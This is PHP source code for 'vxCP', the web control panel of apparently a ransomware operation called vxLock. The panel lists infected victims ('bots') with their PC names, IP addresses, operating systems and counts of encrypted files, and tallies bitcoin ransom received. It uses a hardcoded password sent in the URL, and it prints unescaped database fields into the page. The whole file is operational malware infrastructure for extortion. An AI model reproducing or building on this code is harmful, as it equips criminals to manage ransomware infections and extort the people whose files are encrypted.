<?PHP
include('config.php');

$secret = "!passw0rd.";
$p_id = 0;

if(isset($_GET['page_id'])) $p_id = (int)$_GET['page_id'];
if(!isset($_GET['pw'])) die("Access Denied.");
else
{
	if($_GET['pw'] !== $secret) die("Access Denied.");//Incorrect Password
}
?>

<!doctype HTML>
<html>
<head>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">

	<title>vxLock</title>
	<!-- Latest compiled and minified CSS -->
	<link rel="stylesheet" href="css/bootstrap.min.css">

	<!-- jQuery library -->
	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script>

	<!-- Latest compiled JavaScript -->
	<script src="js/bootstrap.min.js"></script>
</head>
<body>

<div class="container">
  <div class="page-header">
    <h1>vxCP </h1>  
	<ul class="nav nav-pills">
		<li <?PHP if($p_id == 0) echo 'class="active"';?>><a href="?page_id=0&pw=<?PHP echo $secret;?>">Statistics</a></li>
		<li <?PHP if($p_id == 1) echo 'class="active"';?>><a href="?page_id=1&pw=<?PHP echo $secret;?>">Bots</a></li>
		<li <?PHP if($p_id == 2) echo 'class="active"';?>><a href="?page_id=2&pw=<?PHP echo $secret;?>">Info</a></li>
		<li <?PHP if($p_id == 3) echo 'class="active"';?>><a href="?page_id=3">Logout</a></li>
	</ul>
  </div>
  <p></p>
  <?PHP 
  if($p_id == 0) {
	  $sql = "SELECT COUNT(*) FROM bots LIMIT 50";
	  $sql_sum = "SELECT SUM(Encrypted) FROM bots";
	  
	  $result = mysql_query($sql);
	  $rows = mysql_fetch_row($result);
	  $result_ = mysql_query($sql_sum);
	  $encrypted_sum = mysql_fetch_row($result_);
	  if($encrypted_sum[0] == null) $encrypted_sum[0] = 0;
	  
	  print ('
	<div class="panel panel-primary">
		<div class="panel-heading"><span class="glyphicon glyphicon-signal"></span> <b>Stats</b></div>
		<div class="panel-body">
	<table class="table table-hover">
    <thead>
      <tr>
        <th>Total Bots</th>
        <th>Total Files Encrypted</th>
        <th>Total Money Recieved (BTC)</th>
      </tr>
    </thead>
    <tbody>
      <tr>
        <td><b>'.$rows[0].'</b></td>
        <td><b>'.$encrypted_sum[0].'</b></td>
        <td><b>?</b></td>
      </tr>
    </tbody>
  </table>
		</div>
	</div>
	');
}
?>
  
  <?PHP
  if($p_id == 1) {
	  $sql = "SELECT * FROM bots LIMIT 50";
	  $result = mysql_query($sql);
	  
	  print ('
  <div class="panel panel-primary">
		<div class="panel-heading"><span class="glyphicon glyphicon-heart"></span> <b>Bots</b></div>
		<div class="panel-body">
			<table class="table table-hover">
    <thead>
      <tr>
        <th><span class="glyphicon glyphicon-list"></span> Bot UID</th>
        <th><span class="glyphicon glyphicon-user"></span> PC-Name</th>
        <th><span class="glyphicon glyphicon-globe"></span> IPv4</th>
		<th><span class="glyphicon glyphicon-briefcase"></span> OS</th>
		<th><span class="glyphicon glyphicon-lock"></span> Encrypted files</th>
		<th><span class="glyphicon glyphicon-cog"></span> Bot Version</th>
      </tr>
    </thead>
    <tbody>
	');
	while ($row = mysql_fetch_assoc($result)) {
		echo "<tr>";
		echo "<td><b>#".(int)$row["id"]."</b></td>";
		echo "<td><b>".$row["PCName"]."</b></td>";
		echo "<td><b>".$row["IPv4"]."</b></td>";
		echo "<td><b>".$row["OS"]."</b></td>";
		echo "<td><b>".(int)$row["Encrypted"]."</b></td>";
		echo "<td><b>".(int)$row["Version"]."</b></td>";
		echo "</tr>";
	}
   print('
    </tbody>
  </table>
		</div>
  </div>
  ');
  }
  if($p_id == 2) {
	  print('
	  <div class="alert alert-info">
		<strong>Info!</strong> This is Main Control Panel for vxLocked bots, version 3.2.6.5
	  </div>
');
  }
  
  ?>
</div>



<footer>

<div class="container">
<div class="page-footer">
&copy; vxLock - 2017
</div>
</div>
</footer>


</body>
</html>